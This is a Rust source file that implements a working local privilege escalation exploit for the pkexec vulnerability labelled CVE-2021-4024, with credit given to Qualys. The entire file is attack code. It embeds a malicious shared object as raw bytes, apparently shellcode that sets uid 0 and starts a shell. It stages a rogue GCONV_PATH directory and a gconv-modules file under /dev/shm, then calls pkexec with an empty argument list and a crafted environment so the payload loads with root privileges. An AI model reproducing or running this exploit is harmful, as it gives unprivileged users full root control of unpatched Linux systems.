// CVE-2021-4024 
// credits: qualsys
// https://seclists.org/oss-sec/2022/q1/80
// LPE exploit

use std::{
    env,
    io::{Result, Write},
    fs::{self, Permissions}, os::unix::prelude::PermissionsExt,
    ffi::{CString},
    ptr::{null, self},
    path::{PathBuf},
};
use libc::c_char;
use nix::libc;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;

fn to_exec_array(args: &[CString]) -> Vec<*const c_char> {
    let mut args_p: Vec<*const c_char> = args.iter().map(|s| s.as_ptr()).collect();
    args_p.push(ptr::null());
    args_p
}

fn randstr() -> String {
    thread_rng()
        .sample_iter(&Alphanumeric)
        .take(30)
        .map(char::from)
        .collect()
}

fn main() -> Result<()> {

    let evil_so = [ 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x28, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0xeb, 0x06, 0x40, 0x00, 0x38, 0x00, 0x02, 0x00, 0x48, 0xf7, 0xdb, 0xeb, 0x18, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x31, 0xc0, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x69, 0xeb, 0x5a, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x8f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8f, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x48, 0x31, 0xff, 0x0f, 0x05, 0xb8, 0x6a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x5f, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05 ];


    let tmp = randstr();
    let tmpdir = randstr();
    let rmod = randstr();

    let wdir = PathBuf::from(format!("/dev/shm/{}", &tmp));
    fs::create_dir(&wdir)?;
    env::set_current_dir(&wdir)?;

    let dir1 = format!("/dev/shm/{}/GCONV_PATH=.", &tmp);
    fs::create_dir(&dir1)?;
    fs::set_permissions(&dir1, Permissions::from_mode(0o0755))?;

    let file1 = format!("/dev/shm/{}/GCONV_PATH=./{}", &tmp, &tmpdir);
    fs::File::create(&file1)?;
    fs::set_permissions(&file1, Permissions::from_mode(0o0755))?;

    let dir2 = format!("/dev/shm/{}/{}", &tmp, &tmpdir);
    fs::create_dir(&dir2)?;
    fs::set_permissions(&dir2, Permissions::from_mode(0o0755))?;

    let file2 = format!("/dev/shm/{}/{}/gconv-modules", &tmp, &tmpdir);
    let evil_mod = format!("module INTERNAL {}// {} 2\n", &rmod, &rmod);
    let evil_mod_bytes = evil_mod.as_bytes();

    fs::File::create(&file2)?
        .write_all(&evil_mod_bytes)?;

    fs::set_permissions(&file2, Permissions::from_mode(0o0755))?;

    let file3 = format!("/dev/shm/{}/{}/{}.so", &tmp, &tmpdir, &rmod);
    fs::File::create(&file3)?
        .write_all(&evil_so)?;
    fs::set_permissions(&file3, Permissions::from_mode(0o0755))?;

    let pkexec = CString::new("/usr/bin/pkexec")?;
    let envp = [
        CString::new(tmpdir)?,
        CString::new("PATH=GCONV_PATH=.")?,
        CString::new(format!("CHARSET={}", &rmod))?,
        CString::new(format!("SHELL={}", &rmod))?,
    ];
    unsafe {
        let env_p = to_exec_array(&envp);
        let nil = [null()];
        let errno: i32 = libc::execve(pkexec.as_ptr(), nil.as_ptr(), env_p.as_ptr());
        println!("errno = {}", errno);
        Ok(())
    }
}
